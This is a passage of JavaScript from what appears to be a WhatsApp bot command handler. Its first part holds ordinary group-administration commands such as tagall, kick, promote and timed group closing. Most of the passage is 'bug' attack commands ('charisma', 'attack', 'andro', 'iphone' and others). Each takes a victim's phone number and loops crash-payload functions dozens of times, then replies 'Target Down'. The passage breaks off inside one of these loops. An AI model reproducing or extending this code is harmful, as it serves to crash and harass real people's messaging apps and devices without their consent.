                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`HUH?`)
zyn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`ONLY BOT USER!`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Not Admin brother:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Not Admin`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`🕸️`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Not Admin Idiot`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Not Admin Fool :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Not Admin Fool :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'null999': case 'charisma': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂K͕͓͌̎̾ 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : SUKSES

    A̷͙ͭͫ̕T̨͈͗̌ͥA̷͙ͭͫ̕C̵͉͋̔͞K͕͓͌̎̾ B̩͎͍̾ͅḚͭ̉̇͟R͉̜̎͡͠Hͥ̽ͣ̃̔A̷͙ͭͫ̕S̵̙͕̀̃I̍̅̀̎̊L̸̖̽̌͂ C̵͉͋̔͞R͉̜̎͡͠A̷͙ͭͫ̕S̵̙͕̀̃Hͥ̽ͣ̃̔`)
break

case 'fuck': case 'tzy': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
>  Target Down`)
break

case 'xpain': case 'attack': case 'andro': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Killing viruses SENT TO TARGET`)
break

case 'atomic': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
